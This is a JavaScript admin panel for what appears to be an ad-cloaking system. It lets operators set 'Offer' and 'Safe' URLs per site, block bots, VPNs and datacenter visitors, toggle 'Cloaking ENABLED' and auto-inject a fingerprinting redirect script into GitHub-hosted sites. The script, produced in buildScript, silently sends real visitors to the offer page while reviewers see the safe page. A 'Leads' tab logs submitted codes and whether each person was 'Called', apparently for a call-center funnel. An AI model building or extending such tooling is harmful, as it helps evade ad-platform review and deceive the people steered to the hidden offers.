window.addEventListener('error', e => {
  console.error('[window.error]', e.message, 'at', e.filename + ':' + e.lineno);
});

function refreshCurrentSection() {
  const active = document.querySelector('.section.active');
  if (!active) return;
  const id = active.id.replace('sec-','');
  if (id==='logs') loadLogs(1);
  if (id==='leads') loadLeads(1);
  if (id==='dashboard') loadStats();
}

// ── SIDEBAR ──
function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('collapsed');
  document.getElementById('collapse-lbl').textContent = document.getElementById('sidebar').classList.contains('collapsed') ? '' : 'Collapse';
}

// ── CLOCK ──
function startClock() {
  const el = document.getElementById('clock');
  const tz = '${escHtml(settings.timezone||'UTC')}';
  setInterval(() => {
    el.textContent = new Date().toLocaleTimeString('en-US', {timeZone: tz, hour12: true, hour:'2-digit', minute:'2-digit', second:'2-digit'});
  }, 1000);
}

// ── DARK MODE ──
function toggleDark() {
  document.documentElement.classList.toggle('dark');
  localStorage.setItem('filter-dark', document.documentElement.classList.contains('dark'));
}
if (localStorage.getItem('filter-dark') === 'true') document.documentElement.classList.add('dark');

// ── TOAST ──
function toast(msg, type='success') {
  const el = document.createElement('div');
  el.className = 'toast ' + type;
  el.textContent = (type==='success' ? '✓ ' : '✗ ') + msg;
  document.getElementById('toast-container').appendChild(el);
  setTimeout(() => el.remove(), 3500);
}

// ── SSE ──
function setupSSE() {
  const es = new EventSource('/' + ADMIN_PATH + '/events');
  es.addEventListener('newLog', e => {
    const entry = JSON.parse(e.data);
    addFeedItem(entry);
  });
  es.addEventListener('statsUpdate', e => {
    const s = JSON.parse(e.data);
    document.getElementById('kpi-total').textContent = s.total;
    document.getElementById('kpi-allowed').textContent = s.allowed;
    document.getElementById('kpi-blocked').textContent = s.blocked;
    document.getElementById('kpi-leads').textContent = s.leads;
    document.getElementById('kpi-rate').textContent = s.total ? Math.round(s.blocked/s.total*100)+'%' : '0%';
    document.getElementById('feed-badge').textContent = s.total + ' today';
  });
  es.addEventListener('visitorsUpdate', e => {
    const visitors = JSON.parse(e.data);
    document.getElementById('live-count').textContent = visitors.length;
    renderVisDrawer(visitors);
  });
  // Live Leads tab: when a code-submit comes in or a lead's Called status
  // flips, refresh the leads view in place so the new row / updated badge
  // appears within ~1s without a manual refresh. Coalesce bursts to one
  // refresh per second to avoid hammering /api/leads under load.
  let _leadRefreshScheduled = false;
  es.addEventListener('newLead', () => {
    const sec = document.querySelector('.section.active');
    if (!sec || sec.id !== 'sec-leads') return;
    if (_leadRefreshScheduled) return;
    _leadRefreshScheduled = true;
    setTimeout(() => { _leadRefreshScheduled = false; loadLeads(leadPage); }, 800);
  });
  es.addEventListener('siteStatus', e => {
    const d = JSON.parse(e.data);
    const siteIdx = _sites.findIndex(s => s.id === d.id);
    if (siteIdx !== -1) { Object.assign(_sites[siteIdx], d); renderSites(); }
  });
  es.onerror = () => {};
}

// ── STATS ──
let customRangeFrom = null, customRangeTo = null;
function setRange(days, btn) {
  currentRange = days; customRangeFrom = null; customRangeTo = null;
  document.querySelectorAll('.time-tab').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('custom-range-inputs').style.display = 'none';
  loadStats();
}
function toggleCustomRange(btn) {
  const inp = document.getElementById('custom-range-inputs');
  const visible = inp.style.display !== 'none' && inp.style.display !== '';
  document.querySelectorAll('.time-tab').forEach(b => b.classList.remove('active'));
  if (!visible) { inp.style.display = 'flex'; btn.classList.add('active'); } 
  else { inp.style.display = 'none'; }
}
function applyCustomRange() {
  customRangeFrom = document.getElementById('range-from').value;
  customRangeTo   = document.getElementById('range-to').value;
  if (!customRangeFrom) return;
  loadStats();
}
function loadStats() {
  let url = '/' + ADMIN_PATH + '/api/stats?range=' + currentRange + '&site=' + globalSiteFilter;
  if (customRangeFrom) url += '&from=' + customRangeFrom + (customRangeTo ? '&to=' + customRangeTo : '');
  fetch(url)
    .then(r => r.json()).then(s => {
      document.getElementById('kpi-total').textContent = s.total;
      document.getElementById('kpi-allowed').textContent = s.allowed;
      document.getElementById('kpi-blocked').textContent = s.blocked;
      document.getElementById('kpi-rate').textContent = s.blockRate + '%';
      document.getElementById('kpi-leads').textContent = s.leads;
      document.getElementById('live-count').textContent = s.activeVisitors;
      document.getElementById('feed-badge').textContent = s.total + ' in range';
      drawDonut(s.allowed, s.blocked);
      drawBar(s.hourly);
      renderReasons(s.reasons);
      renderCountries(s.topCountries);
    }).catch(() => {});
}

// ── CHARTS ──
function drawDonut(allowed, blocked) {
  const canvas = document.getElementById('donut-chart');
  const ctx = canvas.getContext('2d');
  const total = allowed + blocked || 1;
  const cx = canvas.width/2, cy = canvas.height/2, r = 75, ri = 50;
  ctx.clearRect(0,0,canvas.width,canvas.height);
  const segs = [{v:allowed,c:'#22c55e'},{v:blocked,c:'#ef4444'}];
  let start = -Math.PI/2;
  segs.forEach(seg => {
    const angle = (seg.v/total) * Math.PI * 2;
    ctx.beginPath(); ctx.moveTo(cx,cy);
    ctx.arc(cx,cy,r,start,start+angle);
    ctx.closePath(); ctx.fillStyle = seg.c; ctx.fill();
    start += angle;
  });
  ctx.beginPath(); ctx.arc(cx,cy,ri,0,Math.PI*2);
  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--card').trim() || '#fff';
  ctx.fill();
  ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--text').trim() || '#000';
  ctx.font = 'bold 18px system-ui'; ctx.textAlign='center'; ctx.textBaseline='middle';
  ctx.fillText(total, cx, cy);
  document.getElementById('donut-legend').innerHTML =
    '<span style="color:#22c55e">● Allowed: '+allowed+'</span> &nbsp; <span style="color:#ef4444">● Blocked: '+blocked+'</span>';
}

function drawBar(hourly) {
  const canvas = document.getElementById('bar-chart');
  const ctx = canvas.getContext('2d');
  const keys = Object.keys(hourly).sort();
  if (!keys.length) return;
  const W = canvas.offsetWidth || 400, H = 180;
  canvas.width = W; canvas.height = H;
  ctx.clearRect(0,0,W,H);
  const maxV = Math.max(...keys.map(k=>(hourly[k].allow||0)+(hourly[k].block||0)), 1);
  const bw = Math.max(2, W/keys.length - 2);
  keys.forEach((k,i) => {
    const total = (hourly[k].allow||0)+(hourly[k].block||0);
    const h = (total/maxV)*(H-20);
    const x = i*(bw+2);
    const ah = (hourly[k].allow||0)/maxV*(H-20);
    const bh = h - ah;
    ctx.fillStyle = '#ef4444'; ctx.fillRect(x, H-h, bw, bh);
    ctx.fillStyle = '#22c55e'; ctx.fillRect(x, H-ah, bw, ah);
  });
}

// ── FEED ──
function addFeedItem(entry) {
  const feed = document.getElementById('live-feed');
  const div = document.createElement('div');
  div.className = 'feed-item';
  const flag = countryFlag(entry.country);
  div.innerHTML = '<span style="color:var(--text3);font-size:0.75rem;font-variant-numeric:tabular-nums;">'+fmtTime(entry.ts)+'</span>'
    + (entry.decision==='allow' ? '<span class="badge green">✓</span>' : '<span class="badge red">✗</span>')
    + '<span>'+flag+'</span><span class="mono">'+escH(entry.ip||'')+'</span>'
    + '<span style="color:var(--text3);flex:1;">'+escH(entry.isp||'')+'</span>'
    + (entry.reason && entry.reason!=='ok' ? '<span class="badge orange">'+escH(entry.reason)+'</span>' : '');
  feed.insertBefore(div, feed.firstChild);
  if (feed.children.length > 20) feed.removeChild(feed.lastChild);
}

// ── REASONS ──
function renderReasons(reasons) {
  const row = document.getElementById('reasons-row');
  const colors = {
    'repeat-click':'orange','manual-block':'orange','country-block':'orange',
    'bot-ua':'red','webdriver':'red','no-screen':'red','headless-screen':'red','no-plugins-desktop':'red',
    'datacenter':'red','proxy-vpn':'red','suspicious-isp':'red'
  };
  row.innerHTML = Object.entries(reasons).sort((a,b)=>b[1]-a[1]).map(([r,n]) =>
    '<span class="pill badge '+(colors[r]||'gray')+'">'+escH(r)+' ('+n+')</span>'
  ).join('');
}

// ── COUNTRIES ──
function renderCountries(list) {
  document.getElementById('countries-tbody').innerHTML = list.map(c =>
    '<tr><td>'+countryFlag(c.code)+' '+escH(c.code)+'</td><td>'+c.total+'</td><td>'+c.blocked+'</td>'
    +'<td>'+(c.total?Math.round(c.blocked/c.total*100):0)+'%</td></tr>'
  ).join('');
}

// ── LOGS ──
function debounceLoadLogs() {
  clearTimeout(logDebounce);
  logDebounce = setTimeout(() => loadLogs(1), 300);
}
function loadLogs(page) {
  logPage = page || logPage;
  const q = document.getElementById('log-search').value;
  const dec = document.getElementById('log-decision').value;
  const site = document.getElementById('log-site').value || globalSiteFilter;
  const channel = (document.getElementById('log-channel')||{}).value || 'all';
  const date = document.getElementById('log-date').value;
  let url = '/' + ADMIN_PATH + '/api/logs?page='+logPage+'&q='+encodeURIComponent(q)+'&decision='+dec+'&site='+site+'&channel='+encodeURIComponent(channel);
  if (date) url += '&date='+date;
  fetch(url).then(r=>r.json()).then(d => {
    document.getElementById('log-total-badge').textContent = d.total + ' entries';
    document.getElementById('logs-tbody').innerHTML = d.items.map(l => logRow(l)).join('');
    document.getElementById('logs-pagination').innerHTML = pagBtns(d.page, d.pages, 'loadLogs');
  }).catch(()=>{});
}
function logRow(l) {
  const dec = l.decision==='allow'
    ? '<span class="badge green">✓ Allow</span>'
    : '<span class="badge red">✗ Block</span>';
  return '<tr onclick="toggleDetail(this)" style="cursor:pointer;">'
    +'<td class="mono" style="white-space:nowrap;">'+fmtTime(l.ts)+'</td>'
    +'<td>'+dec+'</td>'
    +'<td><span class="mono">'+escH(l.ip||'')+'</span>'+(l.page?'<br><span style="font-size:0.72rem;color:var(--pri);font-family:monospace;">'+escH(l.page)+'</span>':'')+'</td>'
    +'<td>'+countryFlag(l.country)+' '+escH(l.country||'')+'</td>'
    +'<td style="max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">'+escH(l.isp||'')+'</td>'
    +'<td class="mono">'+escH(l.screen||'')+'</td>'
    +'<td>'+(l.reason&&l.reason!=='ok'?'<span class="badge orange">'+escH(l.reason)+'</span>':'')+'</td>'
    +'<td><button class="btn btn-danger btn-xs" onclick="event.stopPropagation();blockIPQuick(\''+escH(l.ip)+'\')">Block</button></td>'
    +'</tr>'
    +'<tr class="detail-row"><td colspan="8"><div class="row-detail">'
    +'<div class="detail-grid">'
    +detailItem('Timestamp', l.ts)
    +detailItem('IP', l.ip)
    +detailItem('Country', l.country)
    +detailItem('City', l.city)
    +detailItem('Region', l.region)
    +detailItem('ISP', l.isp)
    +detailItem('Org', l.org)
    +detailItem('Screen', l.screen)
    +detailItem('Timezone', l.tz)
    +detailItem('Plugins', l.plugins)
    +detailItem('Webdriver', l.wd ? 'Yes' : 'No')
    +detailItem('Proxy', l.proxy ? 'Yes' : 'No')
    +detailItem('Hosting', l.hosting ? 'Yes' : 'No')
    +detailItem('Decision', l.decision)
    +detailItem('Reason', l.reason)
    +detailItem('Page', l.page)
    +'</div>'
    +'<div style="margin-top:10px;font-size:0.75rem;color:var(--text3);word-break:break-all;">UA: '+escH(l.ua||'')+'</div>'
    +'</div></td></tr>';
}
function detailItem(label, val) {
  return '<div class="detail-item"><label>'+escH(label)+'</label><span>'+escH(String(val||'—'))+'</span></div>';
}
function toggleDetail(tr) {
  const det = tr.nextElementSibling.querySelector('.row-detail');
  det.classList.toggle('open');
}
function blockIPQuick(ip) {
  fetch('/' + ADMIN_PATH + '/block-ip-ajax', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})})
    .then(()=>toast('Blocked: '+ip)).catch(()=>toast('Error','error'));
}

// ── LEADS ──
function loadLeads(page) {
  leadPage = page || leadPage;
  const site = globalSiteFilter;
  const channel = (document.getElementById('lead-channel')||{}).value || 'all';
  fetch('/' + ADMIN_PATH + '/api/leads?page='+leadPage+'&site='+site+'&channel='+encodeURIComponent(channel))
    .then(r=>r.json()).then(d => {
      document.getElementById('leads-total-badge').textContent = d.total + ' leads';
      document.getElementById('leads-tbody').innerHTML = d.items.map(l => leadRow(l)).join('');
      document.getElementById('leads-pagination').innerHTML = pagBtns(d.page, d.pages, 'loadLeads');
    }).catch(()=>{});
}
function leadRow(l) {
  const calledBadge = l.called
    ? '<span class="badge green">✓ Called '+(l.called_at?fmtTime(l.called_at):'')+'</span>'
    : '<span class="badge gray">No</span>';
  const siteName = (_sites.find(s=>s.id===l.site_id)||{}).name || escH(l.site_id||'');
  return '<tr><td class="mono" style="white-space:nowrap;">'+fmtTime(l.ts)+'</td>'
    +'<td class="mono">'+escH(l.ip||'')+'</td>'
    +'<td>'+countryFlag(l.country)+' '+escH(l.country||'')+'</td>'
    +'<td class="mono" style="font-size:0.9rem;font-weight:600;">'+escH(l.code||'')+'</td>'
    +'<td>'+escH(l.utm_source||'')+'</td>'
    +'<td>'+escH(l.utm_campaign||'')+'</td>'
    +'<td>'+calledBadge+'</td>'
    +'<td>'+escH(siteName)+'</td>'
    +'<td>'+(l.called?'':'<button class="btn btn-ghost btn-xs" onclick="markCalled(\''+escH(l.ip||'')+'\',\''+escH(l.ts||'')+'\')">Mark Called</button>')+'</td>'
    +'</tr>';
}
function markCalled(ip, ts) {
  fetch('/'+ADMIN_PATH+'/mark-called',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,ts})})
    .then(()=>{toast('Marked as called');loadLeads();}).catch(()=>toast('Error','error'));
}

// ── BLOCKED IPs ──
function renderBlocked() {
  const ips = _settings.blockedIps || [];
  document.getElementById('blocked-tbody').innerHTML = ips.length ? ips.map(ip =>
    '<tr><td class="mono">'+escH(ip)+'</td>'
    +'<td><button class="btn btn-ghost btn-xs" onclick="unblockIP(\''+escH(ip)+'\')">Unblock</button></td></tr>'
  ).join('') : '<tr><td colspan="2" style="text-align:center;color:var(--text3);padding:20px;">No IPs blocked</td></tr>';
}
function blockIP() {
  const ip = document.getElementById('block-ip-inp').value.trim();
  if (!ip) return;
  fetch('/'+ADMIN_PATH+'/block-ip-ajax',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})})
    .then(()=>{ if (!_settings.blockedIps) _settings.blockedIps=[]; _settings.blockedIps.push(ip); renderBlocked(); toast('Blocked: '+ip); document.getElementById('block-ip-inp').value=''; })
    .catch(()=>toast('Error','error'));
}
function unblockIP(ip) {
  fetch('/'+ADMIN_PATH+'/unblock-ip-ajax',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip})})
    .then(()=>{ _settings.blockedIps=(_settings.blockedIps||[]).filter(x=>x!==ip); renderBlocked(); toast('Unblocked: '+ip); })
    .catch(()=>toast('Error','error'));
}

// ── SITES ──
function renderSites() {
  const container = document.getElementById('sites-list');
  container.innerHTML = _sites.map(site => siteCard(site)).join('');
}

function siteCard(site) {
  const initials = (site.name||'?')[0].toUpperCase();
  const enabledBadge = site.enabled
    ? '<span class="badge green">Active</span>'
    : '<span class="badge gray">Paused</span>';
  const ghBadge = site.githubInjected ? '<span class="badge blue">GitHub ✓</span>' : '';
  const deployBadge = site.deployStatus==='building' ? '<span class="badge orange">Deploying...</span>'
    : site.deployStatus==='live' ? '<span class="badge green">Live</span>'
    : site.deployStatus==='failed' ? '<span class="badge red">Deploy Failed</span>' : '';
  const keyMasked = site.apiKey ? site.apiKey.slice(0,8)+'...'+site.apiKey.slice(-4) : '';
  const script = buildScript(site);
  return \`<div class="site-card" id="site-\${escH(site.id)}">
  <div class="site-card-head" onclick="toggleSiteCard('\${escH(site.id)}')">
    <div class="site-avatar">\${escH(initials)}</div>
    <div class="site-info">
      <div class="site-name">\${escH(site.name)}</div>
      <div class="site-domain">\${escH(site.domain||'No domain set')}</div>
    </div>
    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
      \${enabledBadge} \${ghBadge} \${deployBadge}
      <span style="font-family:monospace;font-size:0.75rem;color:var(--text3);">\${escH(keyMasked)}</span>
      <button class="btn btn-ghost btn-xs" onclick="event.stopPropagation();copyText('\${escH(site.apiKey||'')}')">Copy Key</button>
      <button class="btn btn-ghost btn-xs" onclick="event.stopPropagation();toggleSite('\${escH(site.id)}')">\${site.enabled?'Pause':'Resume'}</button>
      <button class="btn btn-danger btn-xs" onclick="event.stopPropagation();deleteSite('\${escH(site.id)}')">Delete</button>
    </div>
  </div>
  <div class="site-body" id="site-body-\${escH(site.id)}" style="display:none;">
    <div class="site-tabs">
      <div class="site-tab active" onclick="setSiteTab('\${escH(site.id)}','general',this)">General</div>
      <div class="site-tab" onclick="setSiteTab('\${escH(site.id)}','security',this)">Security</div>
      <div class="site-tab" onclick="setSiteTab('\${escH(site.id)}','script',this)">Script</div>
      <div class="site-tab" onclick="setSiteTab('\${escH(site.id)}','railway',this)">Railway</div>
    </div>
    <!-- General -->
    <div class="site-tab-content active" id="stc-\${escH(site.id)}-general">
      <div class="form-grid">
        <div class="form-row"><label>Site Name</label><input class="inp" id="s-\${escH(site.id)}-name" value="\${escH(site.name||'')}"></div>
        <div class="form-row"><label>Domain</label><input class="inp" id="s-\${escH(site.id)}-domain" value="\${escH(site.domain||'')}"></div>
        <div class="form-row"><label>Offer URL</label><input class="inp" id="s-\${escH(site.id)}-money" value="\${escH(site.moneyUrl||'')}"></div>
        <div class="form-row"><label>Safe URL</label><input class="inp" id="s-\${escH(site.id)}-safe" value="\${escH(site.safeUrl||'')}"></div>
        <div class="form-row"><label>GitHub Repo URL</label><input class="inp" id="s-\${escH(site.id)}-github" value="\${escH(site.githubRepo||'')}"></div>
        <div class="form-row"><label>Google Ad URL (reference)</label><input class="inp" id="s-\${escH(site.id)}-ad" value="\${escH(site.adUrl||'')}"></div>
        <div class="form-row"><label>Allowed Countries (space-separated)</label><input class="inp" id="s-\${escH(site.id)}-countries" value="\${escH((site.allowedCountries||[]).join(' '))}"></div>
      </div>
      <div style="display:flex;gap:8px;">
        <button class="btn btn-primary btn-sm" onclick="saveSiteSettings('\${escH(site.id)}')">Save &amp; Push</button>
        <button class="btn btn-ghost btn-sm" onclick="regenKey('\${escH(site.id)}')">Regen API Key</button>
      </div>
    </div>
    <!-- Security -->
    <div class="site-tab-content" id="stc-\${escH(site.id)}-security">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px;">
        \${[['botBlocking','Bot UA Blocking'],['vpnBlocking','VPN/Proxy Blocking'],['proxyBlocking','Datacenter Blocking'],['repeatBlocking','Repeat-Click Blocking'],['ispBlocking','ISP Keyword Blocking'],['countryBlocking','Country Blocking']].map(([k,lbl]) =>
          \`<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border-radius:8px;">
            <span style="font-size:0.85rem;font-weight:600;">\${lbl}</span>
            <label class="toggle"><input type="checkbox" id="ss-\${escH(site.id)}-\${k}" \${site[k]===false?'':site[k]===true?'checked':(_settings[k]?'checked':'')}><span class="slider"></span></label>
          </div>\`).join('')}
      </div>
      <div class="form-row"><label>Custom ISP Keywords (one per line)</label>
        <textarea class="inp" id="ss-\${escH(site.id)}-ispKeywords">\${escH((site.ispKeywords||[]).join('\\n'))}</textarea>
      </div>
      <button class="btn btn-primary btn-sm" onclick="saveSiteSettings('\${escH(site.id)}')">Save</button>
    </div>
    <!-- Script -->
    <div class="site-tab-content" id="stc-\${escH(site.id)}-script">
      <p style="font-size:0.82rem;color:var(--text3);margin-bottom:12px;">Add this script as the VERY FIRST thing inside &lt;head&gt; on your website:</p>
      <div class="code-block" id="script-\${escH(site.id)}">\${escH(script)}</div>
      <div style="display:flex;gap:8px;margin-top:12px;">
        <button class="btn btn-primary btn-sm" onclick="copyText(document.getElementById('script-\${escH(site.id)}').textContent)">Copy Script</button>
        <button class="btn btn-ghost btn-sm" onclick="reInject('\${escH(site.id)}')">Re-inject to GitHub</button>
      </div>
    </div>
    <!-- Railway -->
    <div class="site-tab-content" id="stc-\${escH(site.id)}-railway">
      <div class="form-grid">
        <div class="form-row"><label>Railway Project ID</label><input class="inp" id="s-\${escH(site.id)}-rpid" value="\${escH(site.railwayProjectId||'')}"></div>
        <div class="form-row"><label>Railway Service ID</label><input class="inp" id="s-\${escH(site.id)}-rsid" value="\${escH(site.railwayServiceId||'')}"></div>
      </div>
      <div style="margin-bottom:12px;">
        Deploy status: \${deployBadge || '<span class="badge gray">Unknown</span>'}
      </div>
      <button class="btn btn-primary btn-sm" onclick="saveRailway('\${escH(site.id)}')">Save Railway IDs</button>
    </div>
  </div>
</div>\`;
}

function buildScript(site) {
  const hub = window.location.origin;
  return \`(function(){\\n  var _h='\${hub}',_k='\${(site.apiKey||'')}';\\n  try{\\n    fetch(_h+'/api/v1/pixel',{method:'POST',headers:{'Content-Type':'application/json','X-Client-ID':_k},body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,pg:window.location.pathname})})\\n    .then(function(r){return r.json()})\\n    .then(function(d){if(d&&d.url)window.location.replace(d.url)})\\n    .catch(function(){});\\n  }catch(e){}\\n})();\`;
}

function toggleSiteCard(id) {
  const body = document.getElementById('site-body-'+id);
  body.style.display = body.style.display==='none' ? 'block' : 'none';
}
function setSiteTab(siteId, tab, el) {
  document.querySelectorAll('#site-'+siteId+' .site-tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('#site-'+siteId+' .site-tab-content').forEach(t=>t.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('stc-'+siteId+'-'+tab).classList.add('active');
}
function toggleSite(id) {
  fetch('/'+ADMIN_PATH+'/sites/'+id+'/toggle',{method:'POST'})
    .then(r=>r.json()).then(d=>{ const s=_sites.find(x=>x.id===id); if(s){s.enabled=d.enabled;renderSites();} toast(d.enabled?'Site resumed':'Site paused'); })
    .catch(()=>toast('Error','error'));
}
function deleteSite(id) {
  if (!confirm('Delete this site? This cannot be undone.')) return;
  fetch('/'+ADMIN_PATH+'/sites/'+id+'/delete',{method:'POST'})
    .then(()=>{ _sites=_sites.filter(s=>s.id!==id); renderSites(); toast('Site deleted'); })
    .catch(()=>toast('Error','error'));
}
function saveSiteSettings(id) {
  const g = (field) => { const el=document.getElementById('s-'+id+'-'+field); return el ? el.value : ''; };
  const gs = (field) => { const el=document.getElementById('ss-'+id+'-'+field); return el ? el.checked : false; };
  const gkw = () => { const el=document.getElementById('ss-'+id+'-ispKeywords'); return el ? el.value : ''; };
  const data = {
    name: g('name'), domain: g('domain'), moneyUrl: g('money'), safeUrl: g('safe'),
    githubRepo: g('github'), adUrl: g('ad'), allowedCountries: g('countries'),
    railwayProjectId: g('rpid')||undefined, railwayServiceId: g('rsid')||undefined,
    botBlocking: String(gs('botBlocking')), vpnBlocking: String(gs('vpnBlocking')),
    proxyBlocking: String(gs('proxyBlocking')), repeatBlocking: String(gs('repeatBlocking')),
    ispBlocking: String(gs('ispBlocking')), countryBlocking: String(gs('countryBlocking')),
    ispKeywords: gkw()
  };
  fetch('/'+ADMIN_PATH+'/sites/'+id+'/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(r=>r.json()).then(()=>{ const s=_sites.find(x=>x.id===id); if(s){Object.assign(s,data,{botBlocking:gs('botBlocking'),vpnBlocking:gs('vpnBlocking'),proxyBlocking:gs('proxyBlocking'),repeatBlocking:gs('repeatBlocking'),ispBlocking:gs('ispBlocking'),countryBlocking:gs('countryBlocking')});} toast('Settings saved & push started'); })
    .catch(()=>toast('Error saving','error'));
}
function saveRailway(id) { saveSiteSettings(id); }
function regenKey(id) {
  if (!confirm('Regenerate API key? The old script will stop working.')) return;
  fetch('/'+ADMIN_PATH+'/sites/'+id+'/regenerate-key',{method:'POST'})
    .then(r=>r.json()).then(d=>{ if(d.ok){ const s=_sites.find(x=>x.id===id); if(s){s.apiKey=d.apiKey;renderSites();} toast('Key regenerated'); }})
    .catch(()=>toast('Error','error'));
}
function reInject(id) {
  toast('Injecting to GitHub...');
  fetch('/'+ADMIN_PATH+'/sites/'+id+'/inject',{method:'POST'})
    .then(r=>r.json()).then(d=>{ toast(d.ok?'GitHub inject success!':'Inject failed — check token and repo',''+(!d.ok?'error':'success')); })
    .catch(()=>toast('Error','error'));
}

// ── ADD SITE MODAL ──
function openAddSite() { document.getElementById('add-site-modal').classList.add('open'); }
function closeAddSite() { document.getElementById('add-site-modal').classList.remove('open'); }
function addSite() {
  const data = {
    name: document.getElementById('ns-name').value,
    domain: document.getElementById('ns-domain').value,
    moneyUrl: document.getElementById('ns-money').value,
    safeUrl: document.getElementById('ns-safe').value,
    githubRepo: document.getElementById('ns-github').value,
    adUrl: document.getElementById('ns-ad').value
  };
  fetch('/'+ADMIN_PATH+'/sites',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(r=>r.json()).then(d=>{ if(d.ok){_sites.push(d.site);renderSites();closeAddSite();toast('Site created');} })
    .catch(()=>toast('Error','error'));
}

// ── SETTINGS ──
function setSettingsTab(tab, el) {
  document.querySelectorAll('#sec-settings .tab').forEach(t=>t.classList.remove('active'));
  document.querySelectorAll('#sec-settings .tab-pane').forEach(t=>t.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('tab-'+tab).classList.add('active');
}
function saveEngine() {
  const data = { moneyUrl: document.getElementById('st-money').value, safeUrl: document.getElementById('st-safe').value };
  Object.assign(_settings, data);
  saveFeatures(data);
}
function saveSecurity() {
  const bools = ['botBlocking','vpnBlocking','proxyBlocking','repeatBlocking','ispBlocking','countryBlocking'];
  const data = {};
  bools.forEach(k=>{ const el=document.getElementById('st-'+k); if(el) data[k]=String(el.checked); });
  data.ispKeywords = document.getElementById('st-isp-kw').value;
  saveFeatures(data);
}
function saveCountries() {
  saveFeatures({ allowedCountries: document.getElementById('st-countries').value });
}
function saveFeatures(extra) {
  const bools = ['botBlocking','vpnBlocking','proxyBlocking','repeatBlocking','ispBlocking','countryBlocking'];
  const data = { moneyUrl: _settings.moneyUrl||'', safeUrl: _settings.safeUrl||'',
    ispKeywords: (_settings.ispKeywords||[]).join('\\n'),
    allowedCountries: (_settings.allowedCountries||[]).join(' '), ...extra };
  bools.forEach(k=>{ if(data[k]===undefined){ const el=document.getElementById('st-'+k); if(el) data[k]=String(el.checked); } });
  fetch('/'+ADMIN_PATH+'/settings/features',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
    .then(r=>r.json()).then(()=>toast('Settings saved')).catch(()=>toast('Error','error'));
}
function saveTz() {
  const tz = document.getElementById('st-tz').value;
  fetch('/'+ADMIN_PATH+'/set-timezone',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tz})})
    .then(()=>toast('Timezone saved')).catch(()=>toast('Error','error'));
}
function saveGhToken() {
  const t = document.getElementById('st-gh-token').value;
  fetch('/'+ADMIN_PATH+'/settings/github-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({githubToken:t})})
    .then(()=>{toast('GitHub token saved');document.getElementById('st-gh-token').value='';}).catch(()=>toast('Error','error'));
}
function saveRwToken() {
  const t = document.getElementById('st-rw-token').value;
  fetch('/'+ADMIN_PATH+'/settings/railway-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({railwayToken:t})})
    .then(()=>{toast('Railway token saved');document.getElementById('st-rw-token').value='';}).catch(()=>toast('Error','error'));
}
function changePassword() {
  const current=document.getElementById('pw-cur').value,newPwd=document.getElementById('pw-new').value,confirm=document.getElementById('pw-confirm').value;
  fetch('/'+ADMIN_PATH+'/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current,newPwd,confirm})})
    .then(r=>r.json()).then(d=>{ if(d.ok){toast('Password changed');['pw-cur','pw-new','pw-confirm'].forEach(id=>document.getElementById(id).value='');}else{toast(d.error||'Error','error');} }).catch(()=>toast('Error','error'));
}

// ── CLOAKING TOGGLE ──
function updateCloakStatus() {
  const enabled = _settings.enabled !== false;
  document.getElementById('cloak-dot').className = 'dot ' + (enabled?'green':'red');
  document.getElementById('cloak-status-lbl').textContent = enabled ? 'Cloaking ENABLED' : 'Cloaking DISABLED';
  document.getElementById('cloak-status-box').className = 'status-box ' + (enabled?'enabled':'disabled');
}
function toggleCloaking() {
  fetch('/'+ADMIN_PATH+'/toggle-cloaking',{method:'POST'})
    .then(r=>r.json()).then(d=>{ _settings.enabled=d.enabled; updateCloakStatus(); toast(d.enabled?'Cloaking enabled':'Cloaking disabled'); })
    .catch(()=>toast('Error','error'));
}

// ── CLEAR ACTIONS ──
function clearLogs() {
  if (!confirm('Clear all visitor logs?')) return;
  fetch('/'+ADMIN_PATH+'/clear-logs',{method:'POST'}).then(()=>{ toast('Logs cleared'); document.getElementById('logs-tbody').innerHTML=''; }).catch(()=>toast('Error','error'));
}
function clearLeads() {
  if (!confirm('Clear all leads?')) return;
  fetch('/'+ADMIN_PATH+'/clear-leads',{method:'POST'}).then(()=>{ toast('Leads cleared'); document.getElementById('leads-tbody').innerHTML=''; }).catch(()=>toast('Error','error'));
}
function clearFreq() {
  fetch('/'+ADMIN_PATH+'/clear-frequency',{method:'POST'}).then(()=>toast('Frequency store reset')).catch(()=>toast('Error','error'));
}

// ── VISITORS DRAWER ──
function openVisDrawer() { document.getElementById('vis-drawer').classList.add('open'); document.getElementById('vis-overlay').classList.add('open'); }
function closeVisDrawer() { document.getElementById('vis-drawer').classList.remove('open'); document.getElementById('vis-overlay').classList.remove('open'); }
function renderVisDrawer(visitors) {
  const el = document.getElementById('vis-list');
  if (!el) return;
  if (!visitors.length) { el.innerHTML='<p style="color:var(--text3);font-size:0.85rem;">No active visitors</p>'; return; }
  el.innerHTML = visitors.map(v=>'<div style="padding:12px 0;border-bottom:1px solid var(--border);">'
    +'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">'
    +'<span class="mono" style="font-size:0.82rem;">'+escH(v.ip||'')+'</span>'
    +'<span>'+countryFlag(v.country)+'</span>'
